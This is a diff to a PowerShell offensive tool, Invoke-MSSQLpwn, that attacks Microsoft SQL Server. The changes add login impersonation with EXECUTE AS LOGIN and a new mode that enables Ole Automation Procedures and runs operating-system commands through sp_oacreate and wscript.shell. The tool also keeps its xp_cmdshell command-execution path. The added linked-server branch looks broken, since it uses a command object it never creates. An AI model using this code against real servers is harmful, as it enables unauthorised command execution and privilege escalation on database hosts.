@@ -72,7 +72,7 @@ Function Invoke-MSSQLpwn{
         [Parameter(Mandatory=$false)]
         [String]$linkdatabase,
         [Parameter(Mandatory=$false)]
-        [int]$Mode,
+        [Int]$Mode,
         [Parameter(Mandatory=$false)]
         [String]$Link
     )
@@ -189,29 +189,42 @@ Function Invoke-MSSQLpwn{
     if (!($PSBoundParameters.ContainsKey('Link'))){
         $NoLink = "True"
     }
-    
+    if (!($PSBoundParameters.ContainsKey('Mode'))){
+        $Mode = 1
+    }
     # Execute commands on a target - No link
-    if (!$PSBoundParameters.ContainsKey('Link')){
-        if ($PSBoundParameters.ContainsKey('Target')){
-            
-            $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
-            $sqlConnection.ConnectionString = "Server=$Target;Database=$database;Integrated Security=True"
-            try
-            {
-                $sqlConnection.Open()
-                Write-host "[+] " -foregroundcolor green -nonewline; Write-host "Successfully autheticated to $Target" -foregroundcolor yellow
-            } catch {
-                Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "Unable to authenticate to $Target" -foregroundcolor yellow
-                return
+    if ($NoLink){
+        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
+        $sqlConnection.ConnectionString = "Server=$Target;Database=$database;Integrated Security=True"
+        try
+        {
+            $sqlConnection.Open()
+            Write-host "[+] " -foregroundcolor green -nonewline; Write-host "Successfully autheticated to $Target" -foregroundcolor yellow
+        } catch {
+            Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "Unable to authenticate to $Target" -foregroundcolor yellow
+            return
+        }
+        $sqlCmd = New-Object System.Data.SqlClient.SqlCommand
+        $sqlCmd.Connection = $sqlConnection 
+        if ($PSBoundParameters.ContainsKey('Impersonate')){
+            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
+            $reader = $sqlCmd.ExecuteReader()
+            $reader.Close()
+        }
+        if ($Mode -eq 2){
+            $sqlCmd.CommandText = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+            $reader = $sqlCmd.ExecuteReader()
+            $reader.Close()
+
+            $sqlCmd.CommandText = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c ""echo Test > C:\\Tools\\file.txt""';"
+            $reader = $sqlCmd.ExecuteReader()
+            Write-Host "Command output: " -foregroundcolor yellow;
+            while ($reader.Read()){
+                $reader[0]
             }
-            $sqlCmd = New-Object System.Data.SqlClient.SqlCommand
-            $sqlCmd.Connection = $sqlConnection 
-            
-            if ($PSBoundParameters.ContainsKey('Impersonate')){
-                $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
-                $reader = $sqlCmd.ExecuteReader()
-                $reader.Close()
-            }
+            $reader.Close()
+
+        } else {
             $sqlCmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
             $reader = $sqlCmd.ExecuteReader()
             $reader.Close()
@@ -223,7 +236,19 @@ Function Invoke-MSSQLpwn{
                 $reader[0]
             }
             $reader.Close()
-        }  
+        }
+        
+        $sqlConnection.Close()
+    }
+    if ($PSBoundParameters.ContainsKey('Link')){
+        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
+        $sqlConnection.ConnectionString = "Server=$Target;Database=$database;Integrated Security=True"
+        
+        if ($PSBoundParameters.ContainsKey('Impersonate')){
+            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
+            $reader = $sqlCmd.ExecuteReader()
+            $reader.Close()
+        }
     }
    
 }
